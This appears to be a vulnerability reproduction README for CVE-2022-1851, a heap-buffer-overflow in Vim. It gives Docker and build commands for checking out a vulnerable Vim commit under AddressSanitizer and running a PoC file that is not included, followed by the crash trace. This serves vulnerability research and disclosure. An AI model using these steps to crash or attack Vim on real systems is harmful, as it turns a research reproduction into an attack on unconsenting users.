### CVE-2022-1851

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/f8af901a-9a46-440d-942a-8f815b59394d/)

### Docker Container Run Command
```shell
docker build -t cve-2022-1851-poc .
docker run -itd --name CVE-2022-1851-POC cve-2022-1851-poc
docker exec -it CVE-2022-1851-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard 68e64d2c1735f2a39afa8a0475ae29bedb116684

# Install the compilation and installation dependencies for Vim.
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_h11_s.dat -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_h11_s.dat -c :qa!
```

### Description
Observed that:
```shell
=================================================================
==9569==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffb9f10107 at pc 0xaaaaab7a1bd8 bp 0xfffffd9e1670 sp 0xfffffd9e1680
READ of size 1 at 0xffffb9f10107 thread T0
#0 0xaaaaab7a1bd4  (/usr/local/bin/vim+0x4a5bd4)
#1 0xaaaaab53d438  (/usr/local/bin/vim+0x241438)
#2 0xaaaaab7f01d0  (/usr/local/bin/vim+0x4f41d0)
#3 0xaaaaab6329f4  (/usr/local/bin/vim+0x3369f4)
#4 0xaaaaab632750  (/usr/local/bin/vim+0x336750)
#5 0xaaaaab631e20  (/usr/local/bin/vim+0x335e20)
#6 0xaaaaab60930c  (/usr/local/bin/vim+0x30d30c)
#7 0xaaaaab5fe5d8  (/usr/local/bin/vim+0x3025d8)
#8 0xaaaaab9b9384  (/usr/local/bin/vim+0x6bd384)
#9 0xaaaaab9ba5c0  (/usr/local/bin/vim+0x6be5c0)
#10 0xaaaaab9b6c38  (/usr/local/bin/vim+0x6bac38)
#11 0xaaaaab9b6c94  (/usr/local/bin/vim+0x6bac94)
#12 0xaaaaab60930c  (/usr/local/bin/vim+0x30d30c)
#13 0xaaaaab5fe5d8  (/usr/local/bin/vim+0x3025d8)
#14 0xaaaaab5fc510  (/usr/local/bin/vim+0x300510)
#15 0xaaaaabcea554  (/usr/local/bin/vim+0x9ee554)
#16 0xaaaaabce254c  (/usr/local/bin/vim+0x9e654c)
#17 0xaaaaabce1c30  (/usr/local/bin/vim+0x9e5c30)
#18 0xffffbe5373f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#19 0xffffbe5374c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#20 0xaaaaab44d6ec  (/usr/local/bin/vim+0x1516ec)

0xffffb9f10107 is located 7 bytes to the right of 4096-byte region [0xffffb9f0f100,0xffffb9f10100)
allocated by thread T0 here:
#0 0xffffbe85a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaaab44dc44  (/usr/local/bin/vim+0x151c44)
#2 0xaaaaab44d9cc  (/usr/local/bin/vim+0x1519cc)
#3 0xaaaaabcef094  (/usr/local/bin/vim+0x9f3094)
#4 0xaaaaabcecf34  (/usr/local/bin/vim+0x9f0f34)
#5 0xaaaaab788f60  (/usr/local/bin/vim+0x48cf60)
#6 0xaaaaab775af8  (/usr/local/bin/vim+0x479af8)
#7 0xaaaaab46dd14  (/usr/local/bin/vim+0x171d14)
#8 0xaaaaabce96d8  (/usr/local/bin/vim+0x9ed6d8)
#9 0xaaaaabce22a0  (/usr/local/bin/vim+0x9e62a0)
#10 0xaaaaabce1c30  (/usr/local/bin/vim+0x9e5c30)
#11 0xffffbe5373f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#12 0xffffbe5374c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#13 0xaaaaab44d6ec  (/usr/local/bin/vim+0x1516ec)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/local/bin/vim+0x4a5bd4)
Shadow bytes around the buggy address:
0x200ff73e1fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff73e1fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff73e1ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff73e2000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff73e2010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff73e2020:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff73e2030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff73e2040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff73e2050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff73e2060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff73e2070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9569==ABORTING
```



